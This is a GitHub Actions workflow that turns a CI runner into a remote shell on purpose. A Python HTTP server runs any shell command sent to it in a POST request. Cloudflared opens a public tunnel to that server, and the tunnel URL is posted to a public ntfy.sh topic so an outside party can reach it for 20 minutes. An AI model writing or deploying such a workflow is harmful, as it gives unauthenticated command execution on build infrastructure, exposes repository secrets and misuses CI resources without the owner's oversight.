name: dao-main-shell
on:
  push:
    branches: [ main ]
    paths: [ '.dao-run' ]
jobs:
  shell:
    runs-on: ubuntu-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4
      - name: run
        run: |
          echo "=== GHA SHELL ACTIVE ==="
          id && hostname && uname -a
          # Start shell relay server
          python3 -c "
import http.server, json, subprocess as sp, threading, socket

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
        self.wfile.write(json.dumps({'ok':True,'host':socket.gethostname()}).encode())
    def do_POST(self):
        n = int(self.headers.get('Content-Length',0))
        d = json.loads(self.rfile.read(n))
        try:
            out = sp.check_output(d.get('cmd','id'), shell=True, timeout=30, stderr=sp.STDOUT).decode()
        except Exception as e:
            out = str(e)
        self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
        self.wfile.write(json.dumps({'out': out}).encode())
t = threading.Thread(target=lambda: http.server.HTTPServer(('',9090),H).serve_forever())
t.daemon = True; t.start()
print('relay on 9090')
import time; time.sleep(2)
" &
          sleep 2
          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cfd 2>/dev/null
          chmod +x /tmp/cfd
          nohup /tmp/cfd tunnel --url http://localhost:9090 --no-autoupdate > /tmp/cf.log 2>&1 &
          sleep 25
          CF_URL=$(grep -o 'https://[a-z0-9-]*.trycloudflare.com' /tmp/cf.log | tail -1)
          echo "CF_URL=$CF_URL"
          curl -s -X POST https://ntfy.sh/dao276-gha-shell -H "Title: GHA-CF-URL" -d "$CF_URL" || true
          echo "$CF_URL" > /tmp/shell_url.txt
          # Keep alive 20 minutes
          for i in $(seq 1 20); do sleep 60; echo "alive $i/20 url=$CF_URL"; done
